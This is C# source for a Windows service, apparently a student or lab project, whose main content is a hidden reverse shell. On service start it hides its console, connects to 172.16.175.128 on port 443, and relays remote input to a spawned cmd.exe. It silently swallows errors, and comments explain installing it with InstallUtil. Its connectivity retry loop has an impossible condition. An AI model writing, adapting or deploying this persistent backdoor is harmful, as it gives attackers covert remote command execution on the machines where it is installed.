using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace UitService3
{
    public partial class Service1 : ServiceBase
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        static StreamWriter streamWriter;
        // InstallUtil.exe C:\Users\sang\source\repos\UitService3\UitService3\bin\Debug\UitService3.exe
        //cd C:\Windows\Microsoft.NET\Framework\v4.0.30319
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
           var stastus = httpstatus();
            while (stastus >= 300 && stastus < 200) //nếu không kết nối thành công thì gửi lại cho đến khi nhận dc 2XX vd: 200
                stastus = httpstatus();
            reverseShell(); //khi nhận dc 2XX thì tiến hành reverse shell

        }

        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }

        private int httpstatus() //hàm kiểm tra trạng thái http và trả về trạng thái vd: 200, 404
        {
            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create("http://www.google.com/");
            webRequest.AllowAutoRedirect = false;
            HttpWebResponse response = (HttpWebResponse)webRequest.GetResponse();
            //Returns "MovedPermanently", not 301 which is what I want
            var status = (int)response.StatusCode;
            WriteToFile("Service is recall at " + DateTime.Now);
            if (status >=200 && status < 300)
                WriteToFile("sucess, http status: "+ status  + " " + DateTime.Now);
            else
                WriteToFile("failled connection " + DateTime.Now);
            return status;
        }
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
        public void reverseShell() //hàm tạo reverse shell
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            try
            {
                using (TcpClient client = new TcpClient("172.16.175.128", 443)) //tạo kết nối TCP
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                //strInput.Append("\n");
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // silence is golden
            }
        }
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception ex)
                {
                    // silence is golden
                }
            }
        }
    }
}
